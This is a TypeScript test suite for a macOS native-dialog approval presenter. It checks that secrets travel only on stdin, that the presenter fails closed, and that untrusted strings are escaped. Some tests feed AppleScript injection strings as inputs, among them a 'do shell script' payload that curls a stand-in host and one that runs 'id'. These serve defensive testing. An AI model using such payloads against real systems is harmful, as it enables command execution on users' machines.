/**
 * macOS native-dialog approval presenter. Fully hermetic: the osascript process is an INJECTED seam, so no
 * test spawns a real process and no test ever puts a dialog on the operator's screen.
 *
 * The load-bearing properties:
 *  - the binary is the constant absolute `/usr/bin/osascript`, never composed and never via a shell;
 *  - EVERY dynamic value (origin, workspace label, and above all the approval code) travels on stdin and
 *    NEVER in argv — argv is world-readable via `ps`, which would hand the secret to the very local process
 *    this design defends against;
 *  - untrusted display strings cannot inject AppleScript;
 *  - unsupported OS / missing binary / error / timeout all fail CLOSED.
 */
import { describe, it, expect } from "vitest";
import {
  appleScriptLiteral,
  buildApprovalScript,
  createMacOsApprovalPresenter,
  sanitizeField,
  OSASCRIPT_PATH,
  type OsascriptOutcome,
  type OsascriptProcess,
} from "../../src/bridge/macos-approval-presenter";

const PRESENTATION = {
  requestId: "req-1",
  origin: "http://localhost:5173",
  workspaceLabel: "우리 회사",
  approvalCode: "A1B2-C3D4",
};

interface Call {
  command: string;
  args: readonly string[];
  input: string;
  timeoutMs: number;
}

/** Records every invocation instead of spawning anything. */
function fakeProcess(outcome: OsascriptOutcome = { ok: true, stdout: "sellerops_approved" }): OsascriptProcess & { calls: Call[] } {
  const calls: Call[] = [];
  return {
    calls,
    async run(command, args, input, timeoutMs) {
      calls.push({ command, args, input, timeoutMs });
      return outcome;
    },
  };
}

/** A clean osascript exit echoing the given verdict token on stdout. */
const verdict = (token: string): OsascriptOutcome => ({ ok: true, stdout: `${token}\n` });

function presenter(opts: Partial<Parameters<typeof createMacOsApprovalPresenter>[0]> = {}) {
  return createMacOsApprovalPresenter({ platform: "darwin", fileExists: () => true, ...opts });
}

describe("macOS approval presenter — availability (fail-closed)", () => {
  it("is available on macOS with osascript present", () => {
    expect(presenter({ process: fakeProcess() }).available()).toBe(true);
  });

  it("is UNAVAILABLE on a non-macOS host", () => {
    for (const platform of ["linux", "win32", "freebsd"]) {
      const p = createMacOsApprovalPresenter({ platform, fileExists: () => true, process: fakeProcess() });
      expect(p.available()).toBe(false);
    }
  });

  it("is UNAVAILABLE when osascript is missing", () => {
    const p = createMacOsApprovalPresenter({ platform: "darwin", fileExists: () => false, process: fakeProcess() });
    expect(p.available()).toBe(false);
  });

  it("never spawns anything on an unsupported OS — the secret is not even built", async () => {
    const proc = fakeProcess();
    const p = createMacOsApprovalPresenter({ platform: "linux", fileExists: () => true, process: proc });
    expect(await p.present(PRESENTATION)).toEqual({ status: "unavailable", reason: "no_human_channel" });
    expect(proc.calls).toEqual([]);
  });
});

describe("macOS approval presenter — process invocation", () => {
  it("execs the constant absolute osascript path with only the stdin flag in argv", async () => {
    const proc = fakeProcess();
    await presenter({ process: proc }).present(PRESENTATION);
    expect(proc.calls).toHaveLength(1);
    expect(proc.calls[0]!.command).toBe("/usr/bin/osascript");
    expect(OSASCRIPT_PATH).toBe("/usr/bin/osascript");
    // argv is a constant: no dynamic value is ever appended.
    expect(proc.calls[0]!.args).toEqual(["-"]);
  });

  it("passes the approval code ONLY on stdin — never in argv", async () => {
    const proc = fakeProcess();
    await presenter({ process: proc }).present(PRESENTATION);
    const { args, input } = proc.calls[0]!;
    // argv lands in the process table (`ps`) — a code there would be readable by any local process.
    expect(JSON.stringify(args)).not.toContain("A1B2");
    expect(JSON.stringify(args)).not.toContain("C3D4");
    expect(input).toContain("A1B2-C3D4");
  });

  it("passes every other dynamic value only on stdin too", async () => {
    const proc = fakeProcess();
    await presenter({ process: proc }).present(PRESENTATION);
    const { args, input } = proc.calls[0]!;
    for (const dynamic of [PRESENTATION.origin, PRESENTATION.workspaceLabel]) {
      expect(JSON.stringify(args)).not.toContain(dynamic);
      expect(input).toContain(dynamic);
    }
  });

  it("bounds the child with a timeout that outlives the dialog window", async () => {
    const proc = fakeProcess();
    await presenter({ process: proc, dialogSeconds: 30, timeoutMs: 40_000 }).present(PRESENTATION);
    expect(proc.calls[0]!.timeoutMs).toBe(40_000);
  });
});

describe("macOS approval presenter — verdict mapping", () => {
  it("확인 (approved) → presented", async () => {
    const p = presenter({ process: fakeProcess(verdict("sellerops_approved")) });
    expect(await p.present(PRESENTATION)).toEqual({ status: "presented" });
  });

  it("취소 / Esc (declined) → declined, NOT presented and NOT unavailable", async () => {
    // The live run (2026-07-15) proved a single-button dialog could not express refusal at all; this is the
    // outcome the `cancel button` exists to produce.
    const p = presenter({ process: fakeProcess(verdict("sellerops_declined")) });
    expect(await p.present(PRESENTATION)).toEqual({ status: "declined" });
  });

  it("ignored until auto-dismiss (gave up) → presented, NOT declined", async () => {
    // The code was on screen long enough to read; the human may be typing it into the browser right now.
    // Treating a give-up as refusal would kill a pairing the person completed correctly.
    const p = presenter({ process: fakeProcess(verdict("sellerops_gave_up")) });
    expect(await p.present(PRESENTATION)).toEqual({ status: "presented" });
  });

  it("tolerates surrounding whitespace on the verdict token", async () => {
    const p = presenter({ process: fakeProcess({ ok: true, stdout: "  sellerops_declined \n" }) });
    expect(await p.present(PRESENTATION)).toEqual({ status: "declined" });
  });

  it("fails closed on an unrecognized verdict — we cannot tell what the human did", async () => {
    for (const stdout of ["", "kaboom", "sellerops_", "approved"]) {
      const p = presenter({ process: fakeProcess({ ok: true, stdout }) });
      expect(await p.present(PRESENTATION)).toEqual({ status: "unavailable", reason: "presenter_failed" });
    }
  });
});

describe("macOS approval presenter — fail-closed outcomes", () => {
  it("fails closed on a non-zero exit / dialog error", async () => {
    const p = presenter({ process: fakeProcess({ ok: false, reason: "error" }) });
    expect(await p.present(PRESENTATION)).toEqual({ status: "unavailable", reason: "presenter_failed" });
  });

  it("fails closed on timeout — never claims the human saw the code", async () => {
    const p = presenter({ process: fakeProcess({ ok: false, reason: "timeout" }) });
    expect(await p.present(PRESENTATION)).toEqual({ status: "unavailable", reason: "presenter_failed" });
  });

  it("an error is NOT reported as declined (a fault is not a human refusal)", async () => {
    const p = presenter({ process: fakeProcess({ ok: false, reason: "error" }) });
    expect((await p.present(PRESENTATION)).status).not.toBe("declined");
  });
});

describe("buildApprovalScript — the cancel affordance", () => {
  it("defines a cancel button, without which Esc is inert (live-verified 2026-07-15)", () => {
    const script = buildApprovalScript(PRESENTATION, 30);
    expect(script).toContain('buttons {"취소", "확인"}');
    expect(script).toContain("cancel button 1"); // 취소 is button 1 → Esc maps to it
    expect(script).toContain("default button 2"); // 확인 stays the default action
  });

  it("catches ONLY -128 (user cancelled) — any other error propagates and fails closed", () => {
    const script = buildApprovalScript(PRESENTATION, 30);
    expect(script).toContain("on error number -128");
    // A bare `on error` would swallow no-GUI-session / not-permitted faults and report them as a refusal.
    expect(script).not.toMatch(/on error\s*\n/);
  });

  it("echoes a stable ASCII verdict token rather than relying on localized error text", () => {
    const script = buildApprovalScript(PRESENTATION, 30);
    for (const token of ["sellerops_approved", "sellerops_declined", "sellerops_gave_up"]) {
      expect(script).toContain(token);
    }
    expect(script.trimEnd().endsWith("_verdict")).toBe(true); // the script's result → stdout
  });
});

describe("appleScriptLiteral — untrusted display strings cannot inject AppleScript", () => {
  it("escapes the quote that would close the literal", () => {
    // Without escaping this would end the string and run `do shell script ...` in the agent's session.
    const evil = '" & (do shell script "curl evil.example") & "';
    const literal = appleScriptLiteral(evil);
    expect(literal.startsWith('"')).toBe(true);
    expect(literal.endsWith('"')).toBe(true);
    // The property is that no UNESCAPED quote survives inside the literal (an escaped one still contains a
    // `"` character, so a bare `not.toContain('"')` would be wrong). Strip the escape sequences, then any
    // remaining bare quote would be one that could close the literal early.
    const inner = literal.slice(1, -1);
    const withoutEscapes = inner.replace(/\\\\/g, "").replace(/\\"/g, "");
    expect(withoutEscapes).not.toContain('"');
    expect(literal).toContain('\\"');
  });

  it("escapes backslash first, so it cannot re-open the literal", () => {
    expect(appleScriptLiteral('a\\"b')).toBe('"a\\\\\\"b"');
  });

  it("drops control characters, which are a syntax error inside an AppleScript literal", () => {
    const literal = appleScriptLiteral("a\nb\rc\td e");
    expect(literal).toBe('"abcde"');
  });

  it("keeps non-ASCII (Korean) intact", () => {
    expect(appleScriptLiteral("우리 회사")).toBe('"우리 회사"');
  });

  it("does NOT cap — capping is per-field, and fixed lines must render in full", () => {
    // The cap deliberately lives in `sanitizeField`. If it lived here it would also truncate the approval
    // code and the instruction lines, which is exactly the rendering bug this split fixes.
    expect(appleScriptLiteral("x".repeat(500))).toBe(`"${"x".repeat(500)}"`);
  });
});

describe("sanitizeField — per-field cap on untrusted values", () => {
  it("caps an over-long value and marks the elision", () => {
    const out = sanitizeField("x".repeat(500));
    expect(out).toBe(`${"x".repeat(80)}…`);
  });

  it("leaves a short value untouched, with no elision marker", () => {
    expect(sanitizeField("우리 회사")).toBe("우리 회사");
  });

  it("strips control characters before capping", () => {
    expect(sanitizeField("a\nb\tc")).toBe("abc");
  });

  it("counts by code point, so a long multi-byte value is still bounded", () => {
    expect([...sanitizeField("훼".repeat(500))]).toHaveLength(81); // 80 + the elision marker
  });
});

describe("dialog body — structural integrity under long/hostile input", () => {
  const LONG = "훼".repeat(5000);
  const HOSTILE = '" & (do shell script "id") & "';

  it("preserves real line breaks between body lines", () => {
    const script = buildApprovalScript(PRESENTATION, 90);
    // A line break cannot be a character inside an AppleScript literal (raw newline = syntax error, and
    // control chars are stripped), so it must be AppleScript syntax. Composing with "\n" silently produced
    // a run-on wall of text — the live dump caught it.
    expect(script).toContain("& linefeed &");
    expect(script.match(/& linefeed &/g)!.length).toBe(8); // 9 body lines → 8 joins
  });

  it("a 5000-char workspace label cannot push out the code or the instructions", () => {
    const script = buildApprovalScript({ ...PRESENTATION, workspaceLabel: LONG }, 90);
    expect(script).toContain("A1B2-C3D4"); // the code still renders IN FULL
    expect(script).toContain("이 코드를 브라우저의 연결 확인 화면에 입력하세요.");
    expect(script).toContain("요청한 적이 없다면 [취소]를 누르세요 (코드를 알려주지 마세요)."); // complete, not clipped
  });

  it("a 5000-char origin cannot push out the code or the instructions", () => {
    const script = buildApprovalScript({ ...PRESENTATION, origin: `http://${LONG}` }, 90);
    expect(script).toContain("A1B2-C3D4");
    expect(script).toContain("요청한 적이 없다면 [취소]를 누르세요 (코드를 알려주지 마세요).");
  });

  it("each untrusted field is capped INDEPENDENTLY — one long field cannot consume another's budget", () => {
    const script = buildApprovalScript({ ...PRESENTATION, origin: `http://${LONG}`, workspaceLabel: LONG }, 90);
    // Both are long; both are individually bounded, and neither starves the other or the code.
    expect(script.match(/…/g)).toHaveLength(2);
    expect(script).toContain("A1B2-C3D4");
    expect(script).not.toContain("훼".repeat(200));
  });

  it("a hostile field stays inert text and injects no structure, however long", () => {
    const script = buildApprovalScript({ ...PRESENTATION, workspaceLabel: HOSTILE.repeat(50) }, 90);
    const benign = buildApprovalScript(PRESENTATION, 90);
    expect(script.split("\n")).toHaveLength(benign.split("\n").length); // no injected lines
    expect(script.match(/display dialog/g)).toHaveLength(1); // no second dialog term
    expect(script.match(/& linefeed &/g)!.length).toBe(8); // no injected concatenation

    // The payload's TEXT legitimately appears inside the literal (it is what the human is shown). The real
    // property is that it contributes no literal DELIMITER: strip the escape sequences, and the remaining
    // quotes — the actual literal boundaries — must be exactly the same count as the benign script's. A
    // single unescaped quote from the payload would add two and let it break out as a term.
    const delimiters = (s: string): number =>
      (s.replace(/\\\\/g, "").replace(/\\"/g, "").match(/"/g) ?? []).length;
    expect(delimiters(script)).toBe(delimiters(benign));
    expect(delimiters(script) % 2).toBe(0); // every literal opens and closes
  });

  it("the body keeps every line even when both untrusted fields are empty", () => {
    const script = buildApprovalScript({ ...PRESENTATION, origin: "", workspaceLabel: "" }, 90);
    expect(script.match(/& linefeed &/g)!.length).toBe(8);
    expect(script).toContain("A1B2-C3D4");
  });
});

describe("buildApprovalScript", () => {
  it("routes an injection attempt in the workspace label through escaping", async () => {
    const proc = fakeProcess();
    await presenter({ process: proc }).present({
      ...PRESENTATION,
      workspaceLabel: '" & (do shell script "id") & "',
    });
    const script = proc.calls[0]!.input;
    // The payload survives as inert TEXT inside the literal; it never becomes a second AppleScript term.
    expect(script).toContain('\\" & (do shell script \\"id\\") & \\"');
    expect(script.match(/display dialog/g)).toHaveLength(1);
    // The structural invariant: a hostile label adds NO lines and NO statements. Comparing against the
    // benign script is stronger than a fixed line count — the payload cannot inject structure at all.
    const benign = buildApprovalScript(PRESENTATION, 90);
    expect(script.split("\n")).toHaveLength(benign.split("\n").length);
    expect(script.match(/do shell script/g)).toHaveLength(1); // present only as escaped text, not a term
  });

  it("gives up after the configured window so an ignored dialog cannot linger", () => {
    expect(buildApprovalScript(PRESENTATION, 45)).toContain("giving up after 45");
  });

  it("shows the code, origin and workspace to the human", () => {
    const script = buildApprovalScript(PRESENTATION, 30);
    expect(script).toContain("A1B2-C3D4");
    expect(script).toContain("http://localhost:5173");
    expect(script).toContain("우리 회사");
  });
});
